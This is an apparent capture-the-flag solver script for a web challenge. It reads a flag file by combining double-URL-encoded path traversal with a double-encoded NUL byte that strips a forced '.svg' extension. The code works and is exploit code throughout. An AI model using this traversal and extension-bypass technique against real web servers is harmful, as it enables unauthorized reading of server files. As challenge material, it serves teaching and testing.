#!/usr/bin/env python3
# emoji-browser solver.
#
# The /emoji/<name> endpoint appends ".svg" and serves assets/emoji/<name>.svg.
# A double-URL-encoded path traversal (..%252F -> ..%2F -> ../) climbs out of
# assets/emoji/, and a double-encoded NUL (%2500 -> %00) trips the app's own
# "[0x00_NULL_SENTINAL]" truncation to drop the forced ".svg" extension, letting
# us read flag.txt from the application root.
#
# Reads $URL (or $HOST/$PORT) from the environment so `pwnmake check` can point
# it at the local container or the live site.
import os
import re
import sys
import requests

URL = os.environ.get("URL")
if not URL:
    host = os.environ.get("HOST", "localhost")
    port = os.environ.get("PORT", "21301")
    URL = f"http://{host}:{port}"
URL = URL.rstrip("/")

# Climb out of assets/emoji/ (2 levels) to the app root; try a couple of extra
# depths for robustness. The NUL sentinel is double-encoded as %2500.
candidates = []
for depth in (2, 3, 4):
    trav = "..%252F" * depth
    candidates.append(f"/emoji/{trav}flag.txt%2500")

flag_re = re.compile(r"sun\{[^}]*\}")
for path in candidates:
    try:
        # Keep our pre-encoded path exactly as-is.
        req = requests.Request("GET", URL + path)
        prepared = req.prepare()
        prepared.url = URL + path
        r = requests.Session().send(prepared, timeout=15)
    except requests.RequestException as e:
        print(f"[!] {path}: {e}", file=sys.stderr)
        continue
    m = flag_re.search(r.text)
    if m:
        print(f"[+] via {path}")
        print(m.group())
        sys.exit(0)

print("[-] flag not found", file=sys.stderr)
sys.exit(1)
